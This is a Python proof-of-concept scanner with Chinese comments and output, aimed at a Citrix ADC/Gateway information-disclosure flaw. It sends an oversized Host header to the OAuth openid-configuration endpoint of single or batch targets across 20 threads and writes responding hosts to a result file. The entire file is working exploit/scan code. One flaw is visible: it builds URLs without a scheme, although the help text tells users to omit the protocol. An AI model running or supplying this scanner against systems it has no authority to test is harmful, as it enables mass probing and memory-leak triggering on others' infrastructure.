import sys,requests,urllib3,argparse
from multiprocessing.dummy import Pool

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    print("""""")
    print("[*] Citrix ADC/Gateway 信息泄露检测\n")

def poc(hostname):
    url = f"{hostname}/oauth/idp/.well-known/openid-configuration"
    headers = {"Host": "a"*24576}  # 漏洞触发
    try:
        r = requests.get(url, headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            print(f"[+] {hostname} 可能存在信息泄露漏洞")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(hostname + "\n")
        else:
            print(f"[-] {hostname} 无法访问目标或未触发漏洞 (状态码 {r.status_code})")
    except:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="Citrix ADC/Gateway 信息泄露检测")
    parser.add_argument("-u", "--url", dest="url", type=str, help="单个目标 (不带协议, e.g. 192.168.1.200)")
    parser.add_argument("-f", "--file", dest="file", type=str, help="批量目标文件，每行一个 IP 或域名")
    args = parser.parse_args()

    targets = []
    if args.url and not args.file:
        targets.append(args.url.strip())
    elif args.file and not args.url:
        with open(args.file, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print(f"Usage: python {sys.argv[0]} -u 192.168.1.200 或 -f targets.txt")
        return

    pool = Pool(20)
    for t in targets:
        pool.apply_async(poc, args=(t,))
    pool.close()
    pool.join()

if __name__ == "__main__":
    main()